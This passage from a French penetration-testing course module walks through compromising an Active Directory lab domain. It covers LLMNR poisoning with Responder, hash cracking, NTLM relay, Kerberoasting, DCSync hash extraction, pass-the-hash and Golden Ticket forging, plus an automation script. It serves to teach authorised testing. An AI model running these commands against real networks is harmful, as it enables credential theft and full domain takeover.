crackmapexec smb 192.168.1.10 -u Guest -p ''
crackmapexec smb 192.168.1.10 -u Guest -p 'Guest'

# ─── Si Guest est actif, énumérer les partages ────────────────────────────────
# --shares : liste les partages SMB accessibles
crackmapexec smb 192.168.1.10 -u Guest -p '' --shares
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `crackmapexec smb ... -u Guest -p ''` | Teste l'accès SMB avec Guest / mot de passe vide |
| `crackmapexec smb ... -u Guest -p 'Guest'` | Teste avec Guest / Guest (mot de passe par défaut) |
| `crackmapexec smb ... -u Guest -p '' --shares` | Liste les partages SMB accessibles avec le compte Guest |
| `[+]` en vert | Connexion réussie (authentifié) |
| `[-]` en rouge | Connexion refusée (mauvais identifiants ou compte désactivé) |

#### Étape 6 : Synthèse

```bash
# ─── Compilation des informations obtenues sans auth ──────────────────────────
# heredoc : génère un fichier Markdown récapitulatif des découvertes
# 'EOF' entre quotes : pas d'expansion de variables (littéral)
cat > exports/recon-no-auth.md << 'EOF'
# Reconnaissance sans authentification — sdv-m2.lab

## DC identifié
- IP : 192.168.1.10
- Hostname : dc01.sdv-m2.lab
- OS : Windows Server 2022

## NULL Session
- [OUI/NON] : Connexion possible via rpcclient

## Guest Account
- [OUI/NON] : Compte Guest actif/partages accessibles

## DNS
- DC : dc01.sdv-m2.lab
- Kerberos : dc01.sdv-m2.lab:88
- LDAP : dc01.sdv-m2.lab:389
- Global Catalog : dc01.sdv-m2.lab:3268

## Utilisateurs découverts
- Administrator (RID 500)
- Guest (RID 501)
- krbtgt (RID 502)
- jdoe (RID 1000)
- asmith (RID 1001)

## Recommandations
- Activer SMB Signing
- Désactiver les NULL sessions
- Désactiver le compte Guest
- Restreindre les transferts de zone DNS
EOF
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `cat > <fichier> << 'EOF'` | Heredoc : écrit le contenu jusqu'au marqueur EOF dans le fichier |
| `'EOF'` | Guillemets simples : empêche l'interprétation des variables ($, `, etc.) |

---

## 8. TP Synthèse

### 8.1 Scénario global

Ce TP de synthèse met en œuvre **l'ensemble du kill chain** vu dans ce module, depuis la capture initiale de hash jusqu'à la compromission totale du domaine.

**Réseau cible :**

```
┌─────────────────────────────────────────────────────────────────┐
│                         sdv-m2.lab                              │
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │   DC01       │    │   WS01      │    │   SQL01     │         │
│  │ 192.168.1.10│    │ 192.168.1.20│    │ 192.168.1.30│         │
│  │ Server 2022 │    │ Windows 10  │    │ Server 2019 │         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│        │                  │                  │                  │
│        └──────────────────┴──────────────────┘                  │
│                         Réseau 192.168.1.0/24                   │
│                                                                 │
│  ┌─────────────┐                                                │
│  │   Kali      │ ← Vous êtes ici                                │
│  │ 192.168.1.99│                                                │
│  └─────────────┘                                                │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 Workflow complet

```
Phase 1 : Reconnaissance passive
    ↓
Phase 2 : Capture de hash (Responder)
    ↓
Phase 3 : Craquage du hash / SMB Relay
    ↓
Phase 4 : Énumération AD (CME, BloodHound, LDAP)
    ↓
Phase 5 : Extraction de hashs (secretsdump.py)
    ↓
Phase 6 : Exécution de commandes (wmiexec/psexec)
    ↓
Phase 7 : Persistance (Golden Ticket)
```

### 8.3 Phase 1 — Reconnaissance

```bash
# ─── Étape 1 : Scan réseau initial ────────────────────────────────────────────
# Identifier les hôtes actifs sur le sous-réseau
# -sn : ping sweep (ICMP echo request) sans scan de ports
# -oN : sortie normale (format nmap)
nmap -sn 192.168.1.0/24 -oN exports/recon/hosts.txt

# ─── Étape 2 : Scan de services ───────────────────────────────────────────────
# Ports typiques AD/services Windows sur le sous-réseau
nmap -p 135,139,445,389,636,88,464,3268,3269,3389,5985,5986 \
  192.168.1.0/24 -oN exports/recon/services.txt

# ─── Étape 3 : DNS Enumeration ────────────────────────────────────────────────
# Découverte des serveurs AD via les enregistrements SRV DNS
dig _ldap._tcp.sdv-m2.lab SRV +short    # Serveurs LDAP
dig _kerberos._tcp.sdv-m2.lab SRV +short # Serveurs Kerberos

# ─── Étape 4 : Test NULL session ──────────────────────────────────────────────
# -c "cmd1;cmd2;cmd3" : exécute plusieurs commandes rpcclient en ligne
# 2>&1 : capture stderr  |  tee : affiche et sauvegarde
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers;enumdomgroups;getdompwinfo" \
  2>&1 | tee exports/recon/null-session.txt

# ─── Étape 5 : Scan SMB avec CME ──────────────────────────────────────────────
# -oJ : sortie JSON (facile à parser)  |  Scan SMB sur tout le sous-réseau
crackmapexec smb 192.168.1.0/24 -oJ exports/recon/cme-scan.json
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `nmap -sn <CIDR>` | Ping sweep : découverte des hôtes actifs sur le réseau |
| `nmap -p <ports> <CIDR>` | Scan des ports AD critiques sur tout le sous-réseau |
| `-oN <fichier>` | Sortie normale (format texte lisible) |
| `rpcclient ... -c "..."` | Exécute des commandes rpcclient directement (sans mode interactif) |
| `2>&1 \| tee <fichier>` | Capture et sauvegarde toute la sortie (stdout + stderr) |
| `crackmapexec smb <CIDR> -oJ` | Scan SMB de tout le sous-réseau au format JSON |

### 8.4 Phase 2 — Capture de hash (Responder)

```bash
# ─── Étape 1 : Lancement de Responder ─────────────────────────────────────────
# -I eth0 : interface réseau  |  -w : WPAD (empoisonnement proxy)
# -v : verbeux  |  -o : dossier de sortie pour les logs
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v \
  -o exports/responder/

# ─── Étape 2 : Simuler une attente / provocation ─────────────────────────────
# Depuis un poste Windows, l'utilisateur tape \\FILESERVER dans l'explorateur
# Responder répond à la requête LLMNR/NBT-NS et capture le hash NTLMv2

# ─── Étape 3 : Récupération du hash ───────────────────────────────────────────
# Crée le dossier de destination  |  Copie le log du hash capturé
mkdir -p exports/hashes
cp /opt/Responder/logs/SMB-NTLMv2-*.txt exports/hashes/responder-hash.txt 2>/dev/null
cat exports/hashes/responder-hash.txt
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `sudo python3 /opt/Responder/Responder.py` | Lance Responder avec les privilèges root (nécessaire pour le raw socket) |
| `-I eth0` | Interface réseau sur laquelle écouter |
| `-w` | Active l'empoisonnement WPAD (découverte automatique du proxy) |
| `-v` | Mode verbeux (affiche toutes les requêtes reçues) |
| `-o <dossier>` | Dossier de sortie pour les logs de capture |
| `cp .../SMB-NTLMv2-*.txt ...` | Copie le fichier de log du hash NTLMv2 capturé |
| `cat <fichier>` | Affiche le contenu du hash capturé |

### 8.5 Phase 3 — Craquage du hash (Hashcat)

```bash
# ─── Option A : Craquage offline ──────────────────────────────────────────────
# -m 5600 : mode hashcat pour NTLMv2 (format NetNTLMv2)
# -O : optimisation (limite la vitesse au profit de la compatibilité)
# --force : ignore les avertissements (GPU/OpenCL)
hashcat -m 5600 exports/hashes/responder-hash.txt \
  /usr/share/wordlists/rockyou.txt --force -O

# --show : affiche les hashs déjà craqués (sans recraquer)
hashcat -m 5600 --show exports/hashes/responder-hash.txt
# Si craqué → mot de passe en clair

# ─── Option B : SMB Relay (si SMB signing désactivé) ──────────────────────────
# Détection des cibles avec SMB signing désactivé :
# --gen-relay-list : génère une liste d'hôtes vulnérables au relay
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt

# Lancement du relay (dans un terminal) :
# -tf : fichier des cibles  |  -smb2support : support SMB2
# -i : mode interactif (shell)  |  -socks : mode SOCKS (proxy)
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt -smb2support -i -socks

# Lancement de Responder sans SMB (autre terminal) :
# Désactive le serveur SMB de Responder pour que ntlmrelayx intercepte le hash
sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf
sudo python3 /opt/Responder/Responder.py -I eth0 -v
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `hashcat -m 5600 ... -O --force` | Craquage de hash NetNTLMv2 (mode 5600) avec la wordlist rockyou |
| `hashcat -m 5600 --show` | Affiche les hashs précédemment craqués (cache potfile) |
| `--gen-relay-list` | CME : détecte les hôtes avec SMB signing désactivé (vulnérables au relay) |
| `impacket-ntlmrelayx -tf ... -smb2support -i -socks` | Relay NTLM : réexpédie le hash capturé vers une cible pour obtenir un shell |
| `-i` | Mode interactif (obtention d'un shell) |
| `-socks` | Mode SOCKS (proxy) pour tunneliser les connexions |
| `sed -i 's/SMB = On/SMB = Off/'` | Modifie la config Responder pour désactiver le SMB (évite la collision avec ntlmrelayx) |

### 8.6 Phase 4 — Énumération AD

```bash
# ─── Avec CrackMapExec ────────────────────────────────────────────────────────
# Authentification avec les identifiants obtenus
MOTDEPASSE='P@ssw0rd'  # ← Remplacer par le mot de passe craqué
UTILISATEUR='jdoe'      # ← Remplacer par l'utilisateur compromis

# Test d'authentification :
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE

# Énumération utilisateurs :
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --users
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --groups
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --shares
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --sessions

# Kerberoasting via CME :
# --kerberoast : extrait les hashs des TGS des comptes avec SPN
crackmapexec ldap 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE \
  --kerberoast exports/hashes/kerb-hashes.txt

# AS-REP Roasting via CME :
# --asreproast : extrait les hashs des comptes sans pré-authentification
crackmapexec ldap 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE \
  --asreproast exports/hashes/asrep-hashes.txt

# ─── Avec BloodHound ─────────────────────────────────────────────────────────
# Collecte des données AD pour analyse des chemins d'attaque
bloodhound-python -d sdv-m2.lab \
  -u $UTILISATEUR -p $MOTDEPASSE \
  -dc dc01.sdv-m2.lab -gc dc01.sdv-m2.lab \
  -c ALL --zip -ns 192.168.1.10 \
  -o exports/bloodhound/

# Analyse :
# 1. Lancer Neo4j : sudo neo4j start
# 2. Lancer BloodHound GUI : /opt/BloodHound/BloodHound &
# 3. Uploader le ZIP
# 4. Exécuter les requêtes Analysis

# ─── Avec ldapdomaindump ──────────────────────────────────────────────────────
# Dump complet de l'AD en fichiers HTML/JSON
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\$UTILISATEUR" -p $MOTDEPASSE \
  -o exports/ldapdump/
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `MOTDEPASSE='...'` | Variable contenant le mot de passe craqué (à personnaliser) |
| `crackmapexec smb ... -u USER -p PASS --users` | Énumération utilisateurs via SAMR |
| `crackmapexec smb ... --groups` | Énumération des groupes |
| `crackmapexec smb ... --shares` | Liste les partages SMB accessibles |
| `crackmapexec smb ... --sessions` | Sessions utilisateurs actives sur la cible |
| `crackmapexec ldap ... --kerberoast` | Kerberoasting via LDAP (extraction TGS) |
| `crackmapexec ldap ... --asreproast` | AS-REP Roasting via LDAP |
| `bloodhound-python -d DOMAIN -u USER -p PASS -c ALL` | Collecte complète BloodHound (utilisateurs, groupes, sessions, ACL, trusts) |
| `-c ALL` | Tous les collecteurs BloodHound (Group, LocalAdmin, Session, Trusts, ACL, etc.) |
| `--zip` | Compresse les résultats en ZIP pour l'import BloodHound |
| `-ns <IP>` | Name Server : résolveur DNS à utiliser |
| `ldapdomaindump ldap://IP -u DOMAIN\\USER -p PASS` | Dump complet AD en HTML (domain_users, domain_groups, domain_computers, etc.) |

### 8.7 Phase 5 — Extraction de hashs (secretsdump.py)

```bash
# ─── DCSync - Extraction NTDS.dit ─────────────────────────────────────────────
# secretsdump.py : extrait la base NTDS.dit via le protocole DRSUAPI (DCSync)
# -just-dc : ne récupère que les hashs du domaine (pas SAM/LSA)
# -outputfile : sauvegarde dans un fichier pour analyse ultérieure
secretsdump.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10 \
  -just-dc -outputfile exports/dcsync

# ─── Analyse des hashs extraits ───────────────────────────────────────────────
cat exports/dcsync.ntds

# Extraire le hash KRBTGT (pour Golden Ticket) :
# grep 'krbtgt' : ligne du compte krbtgt  |  cut -d: -f4 : 4e champ = NT hash
KRBTGT_HASH=$(grep 'krbtgt' exports/dcsync.ntds | cut -d: -f4)
echo "KRBTGT NTHASH: $KRBTGT_HASH"

# Extraire le hash Administrateur :
# grep '^Administrator:' : début de ligne (évite les faux positifs)
ADMIN_HASH=$(grep '^Administrator:' exports/dcsync.ntds | cut -d: -f4)
echo "Admin NTHASH: $ADMIN_HASH"

# ─── Vérification des hashs extraits ──────────────────────────────────────────
# Compter le nombre de comptes extraits :
# wc -l : compte le nombre de lignes dans le fichier
wc -l exports/dcsync.ntds
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `secretsdump.py "DOMAIN/USER:PASS"@IP -just-dc -outputfile` | DCSync : extraction complète des hashs du domaine via DRSUAPI |
| `cat exports/dcsync.ntds` | Affiche le contenu brut des hashs extraits |
| `grep 'krbtgt' ... \| cut -d: -f4` | Extrait le hash NT du compte krbtgt (critique pour Golden Ticket) |
| `grep '^Administrator:' ... \| cut -d: -f4` | Extrait le hash NT de l'Administrateur |
| `wc -l <fichier>` | Compte le nombre de comptes extraits (nombre de lignes) |

### 8.8 Phase 6 — Exécution de commandes

```bash
# ─── Avec wmiexec.py (discret) ────────────────────────────────────────────────
# Exécution via WMI (port 135) : sans fichier sur le disque, logs limités
wmiexec.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10

# ─── Avec psexec.py (moins discret) ───────────────────────────────────────────
# Exécution via SMB (port 445) : copie un binaire + crée un service (plus détectable)
psexec.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10

# ─── Avec CME (exécution rapide) ──────────────────────────────────────────────
# -x whoami : exécute une commande unique sans shell interactif
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE -x whoami

# ─── Pass-the-Hash (avec Administrateur) ──────────────────────────────────────
# Utilise le hash NT de l'Administrateur (extrait via DCSync) sans mot de passe
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ":$ADMIN_HASH"
```

**Explication des commandes :**
| Méthode | Commande | Discrétion | Détection |
|---------|----------|-----------|-----------|
| WMI | `wmiexec.py "DOMAIN/USER:PASS"@IP` | Haute | WMI-Activity |
| PSExec | `psexec.py "DOMAIN/USER:PASS"@IP` | Faible | 7045, 4688 |
| CME | `crackmapexec smb ... -x <cmd>` | Moyenne | Événements SMB |
| PTH | `psexec.py ... -hashes ":$HASH"` | Haute (pas de mot de passe en clair) | Identique à PSExec |

### 8.9 Phase 7 — Golden Ticket (Persistance)

```bash
# ─── Étapes pour forger un Golden Ticket ──────────────────────────────────────
# 1. Récupérer le SID du domaine
# lookupsid : énumération du SID du domaine (nécessaire pour le ticket)
# grep "Domain Sid" : extrait la ligne contenant le SID
# cut -d: -f2 : 2e champ après ":"  |  tr -d ' ' : supprime les espaces
DOMAIN_SID=$(impacket-lookupsid "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10 \
  | grep "Domain Sid" | cut -d: -f2 | tr -d ' ')
echo "Domain SID: $DOMAIN_SID"

# 2. Forger le Golden Ticket
# -nthash : hash NT du compte krbtgt (extrait via DCSync)
# -domain-sid : SID du domaine  |  -user-id 500 : RID de Administrator
# -groups 512,520,518,519 : groupes Domain Admins, Schema Admins, Enterprise Admins, Group Policy Creator Owners
# Administrator : nom d'utilisateur à usurper dans le ticket
impacket-ticketer -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain sdv-m2.lab \
  -user-id 500 \
  -groups 512,520,518,519 \
  Administrator

# 3. Exporter le ticket dans une variable d'environnement
# KRB5CCNAME : variable pointant vers le cache du ticket forgé
export KRB5CCNAME=$(pwd)/Administrator.ccache

# 4. Tester le ticket
# -k : utilise le cache Kerberos  |  -no-pass : pas de mot de passe
impacket-psexec -k -no-pass sdv-m2.lab/Administrator@dc01.sdv-m2.lab

# 5. Vérifier que nous sommes SYSTEM :
# C:\Windows\system32> whoami
# nt authority\system
# C:\Windows\system32> hostname
# DC01
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `impacket-lookupsid ... \| grep "Domain Sid" \| cut -d: -f2` | Extrait le SID du domaine (nécessaire pour forger le ticket) |
| `impacket-ticketer -nthash <hash> -domain-sid <SID> ...` | Forge un Golden Ticket (TGT) avec le hash KRBTGT |
| `-nthash` | Hash NT du compte krbtgt (clé de signature du TGT) |
| `-domain-sid` | SID du domaine (permet de construire les SID des groupes) |
| `-user-id 500` | RID du compte Administrateur intégré (500) |
| `-groups 512,520,518,519` | RIDs des groupes privilégiés (Domain Admins, Schema, Enterprise, GPO Creator) |
| `KRB5CCNAME=<chemin>` | Variable d'environnement pointant vers le cache du ticket Kerberos |
| `-k` | Utilise le ticket Kerberos en cache (pas d'identification par mot de passe) |
| `-no-pass` | Empêche la demande interactive de mot de passe |

### 8.10 Tableau MITRE ATT&CK

| Technique | ID MITRE | Outil utilisé | Description |
|-----------|----------|---------------|-------------|
| Account Discovery | T1087 | ldapsearch, windapsearch, CME | Énumération des comptes AD |
| Permission Groups Discovery | T1069 | BloodHound, enum4linux | Découverte des groupes |
| System Network Connections Disc. | T1049 | CrackMapExec | Cartographie du réseau |
| OS Credential Dumping | T1003.003 | secretsdump.py (SAM) | Extraction SAM |
| OS Credential Dumping | T1003.006 | secretsdump.py (DCSync) | Extraction NTDS.dit |
| Steal or Forge Kerberos Tickets | T1558.001 | ticketer.py (Golden) | Forge de Golden Ticket |
| Steal or Forge Kerberos Tickets | T1558.003 | GetUserSPNs.py | Kerberoasting |
| Steal or Forge Kerberos Tickets | T1558.004 | GetNPUsers.py | AS-REP Roasting |
| Man-in-the-Middle | T1557 | Responder | Empoisonnement LLMNR |
| LLMNR/NBT-NS Poisoning | T1557.001 | Responder | Capture de hash NTLMv2 |
| Remote Services | T1021.002 | psexec.py, wmiexec.py | Exécution à distance SMB/WMI |
| Remote Services | T1021.003 | dcomexec.py | Exécution via DCOM |
| Remote Services | T1021.006 | wmiexec.py | Exécution via WinRM |
| Use Alternate Authentication Material | T1550.002 | Pass-the-Hash | Utilisation hash NTLM |
| Use Alternate Authentication Material | T1550.003 | Pass-the-Ticket | Utilisation ticket Kerberos |
| Remote System Discovery | T1018 | nmap, dig, CME | Découverte des hôtes |
| Domain Trust Discovery | T1482 | ldapsearch, BloodHound | Énumération des trusts |
| Valid Accounts | T1078 | Guest, NULL session | Utilisation comptes par défaut |
| Brute Force | T1110.003 | Password Spraying | Test de mots de passe |

### 8.11 Heat Map d'attaque AD

La heat map ci-dessous représente les différents chemins d'attaque possibles dans un environnement AD typique, du niveau de privilège le plus bas (utilisateur domaine) au plus haut (contrôleur de domaine) :

```
                              ┌───────────────────┐
                              │  Contrôleur de     │
                              │  Domaine (DC)      │
                              │  ✦ CIBLE FINALE ✦ │
                              └────────┬──────────┘
                                       │
                        ┌──────────────┼──────────────┐
                        │              │              │
               ┌────────┴───┐  ┌───────┴──────┐  ┌───┴────────┐
               │ DCSync     │  │ Golden Ticket │  │ Admin      │
               │ (DRSUAPI)  │  │ (KRBTGT)     │  │ local DC   │
               └────────────┘  └──────────────┘  └────────────┘
                        ▲              ▲              ▲
                        │              │              │
               ┌────────┴──────────────┴──────────────┴────────┐
               │           Domain Admins / Enterprise Admins    │
               │               ✦ HIGH VALUE TARGETS ✦          │
               └────────┬──────────────┬──────────────┬────────┘
                        │              │              │
              ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴──────────┐
              │ Kerberoast  │  │ ACL Abuse    │  │ Delegation   │
              │ (SPN)       │  │ (WriteDacl)  │  │ (Constrained)│
              └─────────────┘  └──────────────┘  └──────────────┘
                        ▲              ▲              ▲
                        │              │              │
              ┌─────────┴──────────────┴──────────────┴──────────┐
              │          Utilisateurs privilégiés                 │
              │          (AdminCount=1, HA/service accounts)      │
              └────────┬──────────────┬──────────────┬───────────┘
                       │              │              │
             ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴───────────┐
             │ AS-REP Roast│  │ Session Hijack│  │ SMB Relay     │
             │ (No PreAuth)│  │ (HasSession)  │  │ (NTLM Relay)  │
             └─────────────┘  └──────────────┘  └───────────────┘
                       ▲              ▲              ▲
                       │              │              │
             ┌─────────┴──────────────┴──────────────┴───────────┐
             │              Utilisateurs standard                 │
             │              (jdoe, asmith, etc.)                  │
             └────────┬──────────────┬──────────────┬────────────┘
                      │              │              │
            ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴────────────┐
            │ Responder   │  │ Password      │  │ NULL Session   │
            │ (LLMNR/NBT) │  │ Spraying      │  │ (enum4linux)   │
            └─────────────┘  └──────────────┘  └────────────────┘
                      ▲              ▲              ▲
                      │              │              │
            ┌─────────┴──────────────┴──────────────┴────────────────┐
            │              Aucun accès (Anonyme / Guest)              │
            │              ✦ POINT DE DÉPART ✦                       │
            └────────────────────────────────────────────────────────┘
```

**Légende de la heat map :**
- 🔴 **Rouge** : Accès direct au DC / Domain Admin
- 🟠 **Orange** : Escalade de privilèges possible
- 🟡 **Jaune** : Mouvement latéral / collecte d'infos
- 🟢 **Vert** : Accès initial / Reconnaissance

### 8.12 Checklist de l'engagement

```markdown
# Checklist Engagement AD — Red Team

## Phase 1 : Reconnaissance
- [ ] Scan réseau (nmap, masscan)
- [ ] DNS enumeration (SRV records, zone transfer)
- [ ] NULL session test (enum4linux, rpcclient)
- [ ] Guest account test
- [ ] SMB signing detection (CME)

## Phase 2 : Capture d'identifiants
- [ ] Responder (LLMNR/NBT-NS/MDNS)
- [ ] SMB Relay (si signing désactivé)
- [ ] WPAD poisoning
- [ ] Password spraying
- [ ] Craquage hash (hashcat / john)

## Phase 3 : Énumération
- [ ] LDAP enumeration (ldapsearch, windapsearch)
- [ ] ldapdomaindump (dump complet)
- [ ] BloodHound collecte (SharpHound / BH.py)
- [ ] Import + analyse BloodHound
- [ ] CME : users, groups, shares, sessions
- [ ] Kerberoasting (GetUserSPNs / CME)
- [ ] AS-REP Roasting (GetNPUsers / CME)

## Phase 4 : Exploitation
- [ ] DCSync (secretsdump.py)
- [ ] Extraction NTDS.dit
- [ ] Craquage des hashs NT
- [ ] Pass-the-Hash
- [ ] Exécution distante (wmiexec / psexec / dcomexec)

## Phase 5 : Post-Exploitation
- [ ] Golden Ticket (ticketer.py)
- [ ] Silver Ticket
- [ ] DCSync second DC (si existant)
- [ ] Trust dumping (si trust inter-forêt)
- [ ] Nettoyage des traces

## Rapports
- [ ] Tableau MITRE ATT&CK
- [ ] Heat map des chemins d'attaque
- [ ] Liste des recommandations
- [ ] Extrait des hashs sensibles (proof)
```

### 8.13 Script d'automatisation

```bash
#!/bin/bash
# ─── Script d'automatisation AD Enumeration ──────────────────────────────────
# Utilisation : ./ad-automation.sh <DOMAIN> <DC_IP> <USER> <PASS>
# Auteur : Red Team — SDV M2 2026

# Paramètres passés en arguments
DOMAIN=$1  # Nom du domaine (ex: sdv-m2.lab)
DC_IP=$2   # IP du contrôleur de domaine (ex: 192.168.1.10)
USER=$3    # Nom d'utilisateur (ex: jdoe)
PASS=$4    # Mot de passe (ex: P@ssw0rd)

# Vérification du nombre d'arguments
if [ $# -ne 4 ]; then
    echo "Usage: $0 <DOMAIN> <DC_IP> <USER> <PASS>"
    echo "Ex: $0 sdv-m2.lab 192.168.1.10 jdoe P@ssw0rd"
    exit 1
fi

# Construction de la base DN à partir du domaine
# sed : remplace les points par ",DC=" (ex: sdv-m2.lab → DC=sdv-m2,DC=lab)
BASE_DN="DC=$(echo $DOMAIN | sed 's/\./,DC=/g')"

echo "[+] Target: $DOMAIN ($DC_IP)"
echo "[+] User: $USER"
echo "[+] Base DN: $BASE_DN"

# Création de l'arborescence des résultats
mkdir -p exports/auto/{ldap,bloodhound,cme,secrets}

# 1. LDAP Enumeration
echo "[*] Phase 1: LDAP Enumeration..."
# Recherche de tous les utilisateurs (attributs : sAMAccountName, displayName, mail)
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\\$USER" -w "$PASS" \
  -b "$BASE_DN" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail > exports/auto/ldap/users.txt

# Recherche de tous les groupes (attributs : name, member)
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\\$USER" -w "$PASS" \
  -b "$BASE_DN" "(objectClass=group)" \
  name member > exports/auto/ldap/groups.txt

# 2. BloodHound Collecte
echo "[*] Phase 2: BloodHound Collection..."
# Collecte complète des données AD pour analyse des chemins d'attaque
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" \
  -dc dc01.$DOMAIN -gc dc01.$DOMAIN \
  -c ALL --zip -ns $DC_IP \
  -o exports/auto/bloodhound/ 2>/dev/null

# 3. CME Enumeration
echo "[*] Phase 3: CrackMapExec..."
# Énumération via CME (utilisateurs, groupes, partages)
crackmapexec smb $DC_IP -u $USER -p "$PASS" --users \
  > exports/auto/cme/users.txt 2>&1
crackmapexec smb $DC_IP -u $USER -p "$PASS" --groups \
  > exports/auto/cme/groups.txt 2>&1
crackmapexec smb $DC_IP -u $USER -p "$PASS" --shares \
  > exports/auto/cme/shares.txt 2>&1
# Kerberoasting via LDAP (extraction des TGS)
crackmapexec ldap $DC_IP -u $USER -p "$PASS" --kerberoast \
  exports/auto/secrets/kerb-hashes.txt 2>/dev/null
# AS-REP Roasting via LDAP (comptes sans pré-authentification)
crackmapexec ldap $DC_IP -u $USER -p "$PASS" --asreproast \
  exports/auto/secrets/asrep-hashes.txt 2>/dev/null

# 4. DCSync (si admin)
echo "[*] Phase 4: DCSync..."
# Extraction des hashs du domaine (nécessite des droits élevés)
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC_IP \
  -just-dc -outputfile exports/auto/secrets/dcsync 2>/dev/null

echo "[+] Done! Check exports/auto/ for results."
```

**Explication des commandes :**
| Phase | Commande | Rôle/Explication |
|-------|----------|------------------|
| Paramètres | `$1 $2 $3 $4` | Arguments du script : DOMAIN, DC_IP, USER, PASS |
| Base DN | `sed 's/\./,DC=/g'` | Convertit un FQDN en Distinguished Name LDAP |
| Phase 1 | `ldapsearch ... (objectClass=user) ...` | Énumération de tous les utilisateurs AD |
| Phase 1 | `ldapsearch ... (objectClass=group) ...` | Énumération de tous les groupes AD |
| Phase 2 | `bloodhound-python ... -c ALL` | Collecte BloodHound complète pour analyse graphique |
| Phase 3 | `crackmapexec smb ... --users/groups/shares` | Énumération SMB des utilisateurs, groupes, partages |
| Phase 3 | `crackmapexec ldap ... --kerberoast` | Kerberoasting (extraction de hashs TGS) |
| Phase 3 | `crackmapexec ldap ... --asreproast` | AS-REP Roasting (comptes vulnérables) |
| Phase 4 | `secretsdump.py ... -just-dc -outputfile` | DCSync : extraction des hashs du domaine |
| Redirection | `2>/dev/null` | Supprime les messages d'erreur (pas de pollupostage) |
| `mkdir -p` | Crée l'arborescence des dossiers de sortie |

### 8.14 Ressources complémentaires

#### Outils
- **BloodHound** : https://github.com/BloodHoundAD/BloodHound
- **Responder** : https://github.com/lgandx/Responder
- **CrackMapExec** : https://github.com/byt3bl33d3r/CrackMapExec
- **Impacket** : https://github.com/fortra/impacket
- **Hashcat** : https://github.com/hashcat/hashcat
- **Certipy** : https://github.com/ly4k/Certipy (AD CS exploitation)
- **PKINITtools** : https://github.com/dirkjanm/PKINITtools
- **LAPSToolkit** : https://github.com/leoloobeek/LAPSToolkit
- **PingCastle** : https://github.com/vletoux/pingcastle
- **Purple Knight** : https://www.purpleknight.com/

#### Références
- **MITRE ATT&CK Enterprise Matrix** : https://attack.mitre.org/
- **Active Directory Security** (Sean Metcalf) : https://adsecurity.org/
- **Harmj0y's Blog** : http://blog.harmj0y.net/
- **SpecterOps Blog** : https://posts.specterops.io/
- **Kerberos Attacks** (Microsoft) : https://learn.microsoft.com/en-us/windows-server/security/kerberos/
- **NIS2 Directive** : https://www.enisa.europa.eu/topics/cybersecurity-policy/nis2-directive

#### Wordlists recommandées
- `rockyou.txt` : `/usr/share/wordlists/rockyou.txt`
- `SecLists` : https://github.com/danielmiessler/SecLists
- `OneRuleToRuleThemAll.rule` : règles hashcat

---

## Conclusion

Ce module vous a présenté l'ensemble des techniques fondamentales pour l'attaque d'Active Directory :

1. **Compréhension** de l'architecture AD (domaine, forêt, DC, protocoles)
2. **Énumération** via LDAP avec des outils variés (ldapsearch, windapsearch, ldapdomaindump)
3. **Analyse des relations** avec BloodHound et Neo4j (Cypher queries)
4. **Capture de hashs** avec Responder (empoisonnement LLMNR/NBT-NS)
5. **Cartographie du réseau** avec CrackMapExec (SMB, LDAP, MSSQL, SSH, WinRM)
6. **Exploitation complète** avec Impacket (DCSync, Kerberoasting, exécution distante)
7. **Énumération sans authentification** (NULL sessions, Guest, DNS)
8. **Workflow complet** de la compromission d'un domaine AD

**Prochaine étape :** Module 9 — Attaques avancées AD (AD CS, Kerberos delegation, Golden Ticket, DCSync abus, trusts, forêts, LAPS, GPO abuse, etc.)

---

> **Avertissement légal :** Ces techniques sont présentées uniquement à des fins éducatives et de test d'intrusion autorisé. L'utilisation non autorisée de ces techniques est illégale et contraire à l'éthique. Vous êtes seul responsable de l'utilisation que vous faites de ces connaissances.
